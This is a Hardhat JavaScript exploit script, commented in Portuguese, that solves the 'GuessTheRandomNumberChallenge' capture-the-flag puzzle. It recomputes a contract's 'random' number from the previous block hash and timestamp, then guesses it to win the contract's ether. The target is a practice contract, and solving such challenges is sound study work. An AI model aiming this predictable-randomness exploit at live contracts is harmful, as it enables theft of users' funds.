const hre = require("hardhat");

async function main() {
  console.log("ðŸ” Iniciando exploit do GuessTheRandomNumberChallenge...\n");

  // O endereÃ§o do contrato pode ser passado como variÃ¡vel de ambiente
  // Se nÃ£o fornecido, fazemos o deploy primeiro
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  let deployBlockNumber = null;
  let deployBlock = null;
  
  if (!contractAddress) {
    console.log("ðŸ“¦ Nenhum endereÃ§o fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer] = await hre.ethers.getSigners();
    
    // Deploy do contrato enviando 1 ether
    const GuessTheRandomNumberChallenge = await hre.ethers.getContractFactory("GuessTheRandomNumberChallenge");
    const guessChallenge = await GuessTheRandomNumberChallenge.deploy({
      value: hre.ethers.parseEther("1.0")
    });
    
    const deployTx = guessChallenge.deploymentTransaction();
    await guessChallenge.waitForDeployment();
    contractAddress = await guessChallenge.getAddress();
    
    // Obter o bloco de deploy
    const receipt = await hre.ethers.provider.getTransactionReceipt(deployTx.hash);
    deployBlockNumber = receipt.blockNumber;
    deployBlock = await hre.ethers.provider.getBlock(deployBlockNumber);
    
    console.log("âœ… Contrato deployado em:", contractAddress);
    console.log("ðŸ“Š Bloco de deploy:", deployBlockNumber);
    console.log("");
  }

  // Conectar ao contrato
  const GuessTheRandomNumberChallenge = await hre.ethers.getContractFactory("GuessTheRandomNumberChallenge");
  const contract = GuessTheRandomNumberChallenge.attach(contractAddress);

  // Obter contas
  const [attacker] = await hre.ethers.getSigners();
  
  // Verificar estado antes do exploit
  const balanceBefore = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteBefore = await contract.isComplete();
  
  console.log("ðŸ“ EndereÃ§o do contrato:", contractAddress);
  console.log("ðŸ‘¤ Atacante:", attacker.address);
  console.log("");
  console.log("ðŸ“Š Estado antes do exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceBefore), "ETH");
  console.log("  - Desafio completo:", isCompleteBefore);
  console.log("");

  if (isCompleteBefore) {
    console.log("âœ… O desafio jÃ¡ estÃ¡ completo!");
    return;
  }

  // Obter informaÃ§Ãµes do bloco de deploy
  console.log("ðŸ” Calculando o nÃºmero 'aleatÃ³rio'...\n");
  
  // Se nÃ£o temos o bloco de deploy, vamos tentar encontrÃ¡-lo
  if (!deployBlock) {
    // Buscar o bloco mais recente (assumindo que foi deployado recentemente)
    const currentBlock = await hre.ethers.provider.getBlock("latest");
    deployBlockNumber = currentBlock.number;
    deployBlock = currentBlock;
  }
  
  // Obter o bloco anterior (block.number - 1)
  const previousBlockNumber = deployBlockNumber - 1;
  const previousBlock = await hre.ethers.provider.getBlock(previousBlockNumber);
  
  if (!previousBlock) {
    console.log("âŒ NÃ£o foi possÃ­vel obter o bloco anterior");
    return;
  }

  console.log("ðŸ“Š InformaÃ§Ãµes do bloco usado no cÃ¡lculo:");
  console.log("  - Bloco de deploy:", deployBlockNumber);
  console.log("  - Bloco anterior:", previousBlockNumber);
  console.log("  - Hash do bloco anterior:", previousBlock.hash);
  console.log("  - Timestamp do bloco de deploy:", deployBlock.timestamp);
  console.log("");

  // Calcular o nÃºmero da mesma forma que o contrato
  // answer = uint8(keccak256(block.blockhash(block.number - 1), now))
  // Em Solidity 0.4.21, keccak256 pode receber mÃºltiplos argumentos
  
  // Precisamos calcular keccak256(blockhash, timestamp)
  // Em Solidity 0.4.21, keccak256 concatena os argumentos
  const blockHash = previousBlock.hash;
  const timestamp = deployBlock.timestamp;
  
  // Converter timestamp para bytes32 (uint256 em big-endian)
  const timestampBytes = hre.ethers.zeroPadValue(hre.ethers.toBeHex(timestamp), 32);
  
  // Concatenar blockhash (32 bytes) + timestamp (32 bytes)
  // Em Solidity 0.4.21, keccak256(blockhash, timestamp) concatena os dois
  const combined = hre.ethers.concat([blockHash, timestampBytes]);
  const hash = hre.ethers.keccak256(combined);
  
  // Pegar o primeiro byte (uint8) - em Solidity, uint8 pega o byte menos significativo
  // Mas na verdade, uint8(keccak256(...)) pega os Ãºltimos 8 bits do hash
  const answer = parseInt(hash.slice(-2), 16);
  
  console.log("ðŸ” CÃ¡lculo do nÃºmero:");
  console.log("  - Hash do bloco anterior:", blockHash);
  console.log("  - Timestamp:", timestamp);
  console.log("  - Hash combinado:", hash);
  console.log("  - NÃºmero calculado (uint8):", answer);
  console.log("");

  // Executar o exploit: adivinhar o nÃºmero calculado
  console.log(`ðŸŽ¯ Executando exploit: adivinhando o nÃºmero ${answer}...\n`);
  
  const tx = await contract.guess(answer, {
    value: hre.ethers.parseEther("1.0")
  });
  console.log("ðŸ“¤ Transaction enviada:", tx.hash);
  
  await tx.wait();
  console.log("âœ… Transaction confirmada!\n");

  // Verificar estado apÃ³s o exploit
  const balanceAfter = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteAfter = await contract.isComplete();
  
  console.log("ðŸ“Š Estado apÃ³s o exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceAfter), "ETH");
  console.log("  - Desafio completo:", isCompleteAfter);
  
  if (isCompleteAfter) {
    console.log("\nðŸŽ‰ Desafio completado! O nÃºmero foi calculado e adivinhado corretamente");
    console.log("ðŸ’° VocÃª recebeu 2 ether de volta (1 ether enviado + 1 ether de lucro");
  } else {
    console.log("\nâŒ Algo deu errado. O desafio nÃ£o foi completado.");
    console.log("ðŸ’¡ Pode ser que o bloco usado no cÃ¡lculo nÃ£o seja o correto.");
    console.log("ðŸ’¡ Tente executar o deploy primeiro e depois o exploit imediatamente.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

